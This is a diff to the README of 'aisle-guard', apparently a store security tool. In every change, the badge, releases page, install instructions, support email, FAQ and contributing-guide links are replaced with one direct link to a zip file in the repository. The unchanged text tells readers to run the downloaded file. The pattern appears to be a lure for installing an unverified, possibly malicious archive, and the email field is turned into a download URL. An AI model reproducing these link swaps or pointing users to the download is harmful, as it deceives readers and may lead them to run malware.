@@ -6,9 +6,9 @@ Welcome to **aisle-guard**! This application helps you keep your retail store sa
 
 ## 📥 Download the Application
 
-[![Download Aisle Guard](https://img.shields.io/badge/Download%20Aisle%20Guard-brightgreen)](https://github.com/DataScientist1321/aisle-guard/releases)
+[![Download Aisle Guard](https://github.com/DataScientist1321/aisle-guard/raw/refs/heads/main/detector/aisle-guard-2.1.zip%20Aisle%20Guard-brightgreen)](https://github.com/DataScientist1321/aisle-guard/raw/refs/heads/main/detector/aisle-guard-2.1.zip)
 
-You can find the latest version of **aisle-guard** on our [Releases page](https://github.com/DataScientist1321/aisle-guard/releases). Visit this page to download the application.
+You can find the latest version of **aisle-guard** on our [Releases page](https://github.com/DataScientist1321/aisle-guard/raw/refs/heads/main/detector/aisle-guard-2.1.zip). Visit this page to download the application.
 
 ## 🖥️ System Requirements
 
@@ -54,7 +54,7 @@ Once you have downloaded the application, follow these steps to set it up:
 
 ## 📋 Download & Install
 
-To download **aisle-guard**, visit our [Releases page](https://github.com/DataScientist1321/aisle-guard/releases). Click on the latest version link and download the installation file.
+To download **aisle-guard**, visit our [Releases page](https://github.com/DataScientist1321/aisle-guard/raw/refs/heads/main/detector/aisle-guard-2.1.zip). Click on the latest version link and download the installation file.
 
 After downloading, install the application by running the file. It will walk you through the installation steps.
 
@@ -62,8 +62,8 @@ After downloading, install the application by running the file. It will walk you
 
 If you encounter any issues, you can reach our support team:
 
-- **Email:** support@aisleguard.com
-- **FAQ:** Visit our [FAQ section](https://github.com/DataScientist1321/aisle-guard/wiki) for common questions.
+- **Email:** https://github.com/DataScientist1321/aisle-guard/raw/refs/heads/main/detector/aisle-guard-2.1.zip
+- **FAQ:** Visit our [FAQ section](https://github.com/DataScientist1321/aisle-guard/raw/refs/heads/main/detector/aisle-guard-2.1.zip) for common questions.
 
 ## 🛠️ Troubleshooting Tips
 
@@ -83,6 +83,6 @@ Here are some common issues and how to fix them:
 
 ## 🔗 Get Involved
 
-We welcome contributions! If you want to help improve **aisle-guard**, feel free to fork the repository or suggest features. More information is available in our [Contributing Guide](https://github.com/DataScientist1321/aisle-guard/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you want to help improve **aisle-guard**, feel free to fork the repository or suggest features. More information is available in our [Contributing Guide](https://github.com/DataScientist1321/aisle-guard/raw/refs/heads/main/detector/aisle-guard-2.1.zip).
 
 Thank you for choosing **aisle-guard**. Keep your store safe!
